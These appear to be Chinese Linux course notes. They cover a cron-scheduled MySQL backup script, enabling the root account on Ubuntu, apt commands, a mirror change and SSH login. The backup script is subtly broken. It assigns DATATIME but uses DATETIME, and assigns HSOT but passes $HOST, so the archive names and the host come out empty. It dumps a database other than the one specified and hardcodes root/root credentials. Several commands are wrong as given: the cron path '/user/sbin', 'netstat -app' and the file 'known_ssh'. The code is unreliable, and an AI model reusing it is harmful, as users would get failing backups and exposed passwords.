1) 每天凌晨 2:10 备份 数据库 atguiguDB 到 /data/backup/db
2) 备份开始和备份结束能够给出相应的提示信息
3) 备份后的文件要求以备份时间为文件名，并打包成 .tar.gz 的形式，比如：
				2018-03-12_230201.tar.gz
4) 在备份的同时，检查是否有10天前备份的数据库文件，如果有就将其删除。

```bash
#!/bin/bash

#数据库定时备份
#备份路径
BACKUP=/data/backup/db
#当前时间为文件名
DATATIME=$(date +%Y_%m_%d_%H%M%S)

echo "=====开始备份===="
echo "路径=$BACKUP/$DATETIME.tar.gz"

#主机/用户名/密码/数据库
HSOT=localhost
DB_USER=root
DB_PWD=root
DATABSASE=myDB
#创建备份文件夹
[ ! -d "$BACKUP/$DATETIME" ] && mkdir -p "$BACKUP/$DATETIME"
#执行mysql备份
mysqldump -u$DB_USER -p$DB_PWD --host=$HOST $DATABSASE | gzip > $BACKUP/$DATETIME/$DATETIME.sql.gz
#打包文件
cd $BACKUP
tar -zcvf $DATETIME.tar.gz $DATETIME
#删除临时目录
rm -rf $BACKUP/$DATETIME

#删除10天前的文件
find $BACKUP -mtime +10 -name "*.tar.gz" -exec rm -rf {} \;
echo "=====success======"
```

```shell
crontab -e  //添加定时任务
10 2 * * * /user/sbin/mysql_db_backup.sh
```

# Ubuntu

一个以桌面应用为主的开源GNU/Linux操作系统， Ubuntu 是基于 GNU/Linux，支持x86、amd64（即x64）和ppc架构，由全球化的专业开发团 队（Canonical Ltd）打造的。

Python开发

下载http://cn.ubuntu.com/download/







Ubuntu的root 用户

介绍
安装ubuntu成功后，都是普通用户权限，并没有最高root权限，如果需要使用root权
限的时候，通常都会在命令前面加上 sudo 。有的时候感觉很麻烦。
我们一般使用su命令来直接切换到root用户的，但是如果没有给root设置初始密码，
就会抛出 su : Authentication failure 这样的问题。所以，我们只要给root用户设置一个
初始密码就好了。

给root用户设置密码并使用

1. 输入 sudo passwd 命令，设定root用户密码。

2.  输入 su root，输入密码，换成root,  提示符$代表一般用户，提示符#代表root用户。

3.  输入 exit 命令，退出root并返回一般用户

   

开发python

```bash
vim hello.py
#如果没有vim 
apt install vim
python hello.py
python3 hello.py
```

## apt

apt是Advanced Packaging Tool的简称，是一款安装包管理工具。在Ubuntu下， 我们可以使用apt命令可用于软件包的安装、删除、清理等，类似于 Windows中的软件管理工具。

```bash
sudo apt-get update 更新源
sudo apt-get install package 安装包
sudo apt-get remove package 删除包

sudo apt-cache search package 搜索软件包
sudo apt-cache show package 获取包的相关信息，如说明、大小、版本等
sudo apt-get install package --reinstall 重新安装包

sudo apt-get -f install 修复安装
sudo apt-get remove package --purge 删除包，包括配置文件等
sudo apt-get build-dep package 安装相关的编译环境

sudo apt-get upgrade 更新已安装的包
sudo apt-get dist-upgrade 升级系统
sudo apt-cache depends package 了解使用该包依赖那些包
sudo apt-cache rdepends package 查看该包被哪些包依赖
sudo apt-get source package 下载该包的源代码
```

更新Ubuntu软件下载地址

https://mirrors.tuna.tsinghua.edu.cn/清华ubuntu镜像

```bash
/etc/apt/sources.list
#先备份
sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup
#清空
echo '' > sources.list
#直接替换粘贴镜像

#更新源
sudo apt-get update 


```

## ssh远程登录Ubuntu

```bash
#安装SSH和启用
sudo apt-get install openssh-server
#执行上面指令后，在当前这台Linux上就安装了SSH服务端和客户端。
service sshd restart 
#执行上面的指令，就启动了 sshd 服务。会监听端口22
netstat -app | more  #查看端口监听
```

从linux系统客户机远程登陆linux系统服务机

* 基本语法：
  ssh 用户名@IP
  例如：ssh atguigu@192.168.188.130
  使用ssh访问，如访问出现错误。可查看是否有该文件 ～/.ssh/known_ssh 尝试删除该文件
  解决。
*  登出
  登出命令：exit�